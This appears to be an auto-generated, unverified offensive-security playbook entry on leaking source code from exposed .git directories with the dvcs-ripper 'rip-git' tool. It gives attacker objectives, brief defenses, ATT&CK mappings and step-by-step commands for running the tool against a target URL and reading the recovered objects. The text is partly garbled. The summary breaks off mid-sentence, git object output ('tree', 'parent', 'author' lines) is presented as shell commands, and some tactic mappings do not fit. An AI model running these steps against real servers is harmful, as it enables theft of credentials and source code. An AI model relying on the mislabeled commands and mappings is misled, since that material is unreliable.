---
id: 9677c26b-e369-43db-8e84-0721ca2f8ddf
name: Git Source Code Leakage
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:59.994368+00:00'
updated_at: '2023-04-10T20:33:52.409141+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Dynamic Resolution|T1568 - Dynamic Resolution]]'
- '[[Encrypted Channel|T1573 - Encrypted Channel]]'
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
tags:
- '[[Automatic recovery]]'
- '[[Git]]'
- '[[Insecure Source Code Management]]'
- '[[rip-git]]'
- '[[Tools]]'
commands:
- '[[Clone repository]]'
- '[[Rip git repository]]'
- '[[View author and committer information]]'
- '[[View file contents]]'
- '[[View file contents]]'
- '[[View parent commit]]'
- '[[View tree contents]]'
---

# Git Source Code Leakage

## Summary

Git is a widely used version control system that is often used to manage source code. However, if Git repositories are not properly secured, attackers can easily obtain access to sensitive information. The 'rip-git' tool can be used to automatically recover Git repositories from a target server. At

## Description

# Description

Git is a widely used version control system that is often used to manage source code. However, if Git repositories are not properly secured, attackers can easily obtain access to sensitive information. The 'rip-git' tool can be used to automatically recover Git repositories from a target server. Attackers can use this tool to obtain access to sensitive information, such as passwords, credentials, and source code. This information can be used to carry out further attacks against the target organization.

To use 'rip-git', the attacker only needs to have network access to the target server. Once the tool has been run, it will automatically recover the Git repository from the target server. The attacker can then use the recovered repository to obtain sensitive information.

The business value of this attack is that it allows attackers to obtain sensitive information that can be used to carry out further attacks against the target organization. This can result in financial loss, reputational damage, and other negative consequences.

## Requirements

1. Network access to the target server.

1. The 'rip-git' tool.

## Defense

1. Ensure that Git repositories are properly secured, with appropriate access controls and encryption.

1. Monitor network traffic for signs of Git repository exfiltration.

1. Implement security measures such as two-factor authentication and intrusion detection systems to detect and prevent unauthorized access to the target server.

## Objectives

1. To obtain access to sensitive information, such as passwords, credentials, and source code.

1. To carry out further attacks against the target organization.

# Instructions

1. Run the following commands:

1. git clone https://github.com/kost/dvcs-ripper
2. perl rip-git.pl -v -u "http://web.site/.git/"
3. git cat-file -p 07603070376d63d911f608120eb4b5489b507692
4. tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
5. parent 15ca375e54f056a576905b41a417b413c57df6eb

**Code**: [[git clone https://github.com/kost/dvcs-ripper
perl]]

> The 'git clone' command is used to clone a Git repository from a remote server. In this case, the attacker is cloning the 'dvcs-ripper' repository from GitHub. The 'perl rip-git.pl' command is then used to run the 'rip-git' tool, which will automatically recover the Git repository from the target server. The 'git cat-file' command is then used to view the contents of a specific object in the Git repository. In this case, the object with the ID '07603070376d63d911f608120eb4b5489b507692' is being viewed. The 'tree' command is used to view the contents of a specific tree in the Git repository. In this case, the tree with the ID '5dae937a49acc7c2668f5bcde2a9fd07fc382fe2' is being viewed. The 'parent' command is used to view the parent object of a specific object in the Git repository. In this case, the parent of the object with the ID '15ca375e54f056a576905b41a417b413c57df6eb' is being viewed.

**Command** ([[Clone repository]]):

```bash
git clone https://github.com/kost/dvcs-ripper
```

**Command** ([[Rip git repository]]):

```bash
perl rip-git.pl -v -u "http://web.site/.git/"
```

**Command** ([[View file contents]]):

```bash
git cat-file -p 07603070376d63d911f608120eb4b5489b507692
```

**Command** ([[View tree contents]]):

```bash
tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
```

**Command** ([[View parent commit]]):

```bash
parent 15ca375e54f056a576905b41a417b413c57df6eb
```

**Command** ([[View author and committer information]]):

```bash
author Michael <michael@easyctf.com> 1489389105 +0000
committer Michael <michael@easyctf.com> 1489389105 +0000
```

**Command** ([[View file contents]]):

```bash
git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Dynamic Resolution|T1568 - Dynamic Resolution]]
- [[Encrypted Channel|T1573 - Encrypted Channel]]
- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

## Commands Used

- [[Clone repository]]
- [[Rip git repository]]
- [[View author and committer information]]
- [[View file contents]]
- [[View file contents]]
- [[View parent commit]]
- [[View tree contents]]

## Tags

- [[Automatic recovery]]
- [[Git]]
- [[Insecure Source Code Management]]
- [[rip-git]]
- [[Tools]]
